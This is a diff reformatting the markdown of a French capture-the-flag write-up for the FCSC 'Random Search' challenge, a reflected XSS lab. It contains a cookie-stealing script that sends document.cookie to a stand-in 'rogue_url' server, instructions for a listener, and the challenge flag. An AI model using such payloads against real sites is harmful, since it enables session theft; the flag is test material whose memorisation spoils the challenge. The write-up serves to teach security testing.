@@ -1,14 +1,14 @@
-# Random Search 
+# Random Search
 
-catégorie | points
-:-----: | :-----:
-Intro | 20
+| catégorie | points |
+| :-------: | :----: |
+|   Intro   |   20   |
 
 ## 0x0 Intro
 
->Pourrez-vous voler le cookie de l'administrateur qui visite les pages ?
+> Pourrez-vous voler le cookie de l'administrateur qui visite les pages ?
 >
->http://challenges2.france-cybersecurity-challenge.fr:5001/
+> http://challenges2.france-cybersecurity-challenge.fr:5001/
 
 ## 0x1 Explications
 
@@ -32,8 +32,8 @@ Puis nous avons un lien **contact**, qui lui nous demande de remonter des URL en
 
 Déjà, on peut imaginer que:
 
-* la zone **Rechercher** ne sera pas le bon vecteur, car elle n'impactera que nous. Mais nous le vérifierons quand même pour le Write-Up
-* la zone **URL** de contact, en effet, si nous voulons voler le cookie de l'admin, cela me semble être le meilleur vecteur
+- la zone **Rechercher** ne sera pas le bon vecteur, car elle n'impactera que nous. Mais nous le vérifierons quand même pour le Write-Up
+- la zone **URL** de contact, en effet, si nous voulons voler le cookie de l'admin, cela me semble être le meilleur vecteur
 
 ## 0x3 Exploitation
 
@@ -50,9 +50,11 @@ Que ce passerait-il si nous insérons un script dedans ?
 
 ![](./IMG/2.png)
 
-Le résultat n'est pas probant, pas d'affichage de popup et on vois que le titre de la recherche n'est plus le même, mais l'URL elle à été changée par: 
+Le résultat n'est pas probant, pas d'affichage de popup et on vois que le titre de la recherche n'est plus le même, mais l'URL elle à été changée par:
 
-> "?search=\<script\>alert\(miaou\)%3B\<%2Fscript\>"
+```javascript
+<script>alert(miaou)%3B<%2Fscript>
+```
 
 Ce qui confirme ce que nous pensions au début, la partie vulnérable est dans **URL**.
 
@@ -62,13 +64,15 @@ Bien évidement, comme c'est l'admin qui va lire le script, nous n'allons pas lu
 
 Pour cela, nous allons utiliser le script suivant :
 
-> "\<script\>document.location='http://rogue_url:8000/?'+document.cookie\</script\>"
+```javascript
+<script>document.location='http://rogue_url:8000/?'+document.cookie<script>
+```
 
 Évidement, remplacez **rogue_url** par votre serveur web, et si vous n'en n'avez pas nous allons en monter un très rapidement.
 
 Pour cela, utiliser la commande suivante dans votre terminal linux (ou windows, et même mac):
 
-```bash
+```python
 python -m http.server
 ```
 
@@ -94,4 +98,4 @@ Nous avons exploité une faille XSS, [La Reflected XSS](https://owasp.org/www-co
 
 Cette faille nous a permis de récupéré le flag qui lui était stocké dans le cookie **admin=** qui lui contenait la valeur suivante:
 
->FCSC{4e0451cc88a9a96e7e46947461382008d8c8f4304373b8907964675c27d7c633}
+> FCSC{4e0451cc88a9a96e7e46947461382008d8c8f4304373b8907964675c27d7c633}
